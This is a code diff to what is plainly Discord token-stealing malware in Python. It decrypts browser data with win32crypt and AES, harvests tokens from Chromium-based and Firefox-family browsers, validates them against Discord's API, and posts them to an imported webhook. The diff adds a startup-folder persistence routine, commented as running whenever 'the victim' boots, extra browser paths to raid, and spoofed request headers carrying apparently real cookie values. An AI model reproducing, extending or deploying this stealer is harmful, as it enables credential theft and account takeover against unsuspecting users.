@@ -4,12 +4,25 @@ import re
 import psutil
 import subprocess
 import platform
+import shutil
 import json
 import base64
 import socket
 from Cryptodome.Cipher import AES
 import win32crypt
 from wh import url
+import sys
+
+def add_to_startup():
+    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+    exe_path = sys.executable  
+    exe_name = os.path.basename(exe_path)
+    destination = os.path.join(startup, exe_name)
+
+    if not os.path.exists(destination):
+        shutil.copyfile(exe_path, destination)
+
+add_to_startup() #persistence (every time the victim turns on their computer the file will run)
 
 webhook = url
 
@@ -42,8 +55,25 @@ def sysinfo():
 
 def verifytks(token):
         headers = {
+            "authority": "discord.com",
             "Authorization": token,
-            "Content-Type": "application/json"
+            "Content-Type": "application/json",
+            "accept": "*/*",
+            "accept-language": "en-US,en;q=0.9",
+            "cookie": "__dcfduid=aac0334017a911f098842f23d84af171; __sdcfduid=aac0334117a911f098842f23d84af1715c6378665ed7cd80ba063fc1a62dcf56778f8b9a5aed615b6b2b87ad6e5d86dc; __cfruid=9a3b1e8892003974bfb9377d754094aa10c673ba-1744467793; _cfuvid=zWNJz3nNT38rNxvzC4SoAKylV6tgKOPzZLTYT4qLNNU-1744467793016-0.0.1.1-604800000; cf_clearance=LoW2_4j4UvTtzz3Aiuu3oK2W5NxiVXAYipg47Rzauzo-1744467803-1.2.1.1-CpA4qYnkf.rvAVDb6sYTOd4qdORu1Z58uoPvw7zJIHxAPOCRugXSyKJoGsOjKQhOajUHlEO2bwVUAM3OE3lW33HHPxu.BdIvwGnXMYDt8MiReUCoURR9jjPeWTB9zCXYsZzmB3uRYlz9CtyCir_TdgZdvu2vRvbgOjIE8SuS4l6EuRxLm4A1Uzmu.t2zuEyJ0sucFJz9JUw46mX2Hpwy0ljcsB5L8lNdzoPdbGVPw9Soe9LiEQzUGfkQZurc2rsfsDS5eNFUJ0gZnaGiVsg29UvVyjcjuP9t1e_IGzlHcGpgcb_X9t_vYAEZRDkjwxD9Wsmv6pl6sa0Mfn2hdEExb1xJey3GZkupTeIo2DucV6g",
+            "origin": "https://discord.com",
+            "referer": "https://discord.com/channels/@me",
+            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": '"Windows"',
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-origin",
+            "x-debug-options": "bugReporterEnabled",
+            "x-discord-locale": "en-US",
+            "x-discord-timezone": "America/New_York",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
+            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MTg4Iiwib3NfdmVyc2lvbiI6IjEwLjAuMjYxMDAiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJoYXNfY2xpZW50X21vZHMiOmZhbHNlLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBkaXNjb3JkLzEuMC45MTg4IENocm9tZS8xMzAuMC42NzIzLjE5MSBFbGVjdHJvbi8zMy40LjAgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjMzLjQuMCIsIm9zX3Nka192ZXJzaW9uIjoiMjYxMDAiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjozODkwMDQsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjYxNDQ0LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
         }
 
         res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
@@ -193,9 +223,11 @@ def chrometks():
     def othertks():
         otherchbrowsers = {
             'Amigo': os.getenv("LOCALAPPDATA") + "\\Amigo\\User Data",
+            'Avast': os.getenv("LOCALAPPDATA") + "\\AVAST Software\\Browser\\User Data",
             'Brave': os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data",
             'Cent': os.getenv("LOCALAPPDATA") + "\\CentBrowser\\User Data",
             'Epic': os.getenv("LOCALAPPDATA") + "\\Epic Privacy Browser\\User Data",
+            'Hola': os.getenv("APPDATA") + "\\Hola\\chromium_profile",
             'Iridium': os.getenv("LOCALAPPDATA") + "\\Iridium\\User Data",
             'Vivaldi': os.getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data",
             'Yandex': os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data",
@@ -272,8 +304,6 @@ def firefox():
         otherffbrowsers = {
         'Waterfox': os.getenv("APPDATA") + "\\Waterfox\\Profiles\\",
         'Librewolf': os.getenv("APPDATA") + "\\LibreWolf\\Profiles\\",
-        'Pale Moon': os.getenv("APPDATA") + "\\Moonchild Productions\\Pale Moon\\Profiles\\",
-        'Basilisk': os.getenv("APPDATA") + "\\Moonchild Productions\\Basilisk\\Profiles\\"
     }
     
         for name, browser in otherffbrowsers.items():
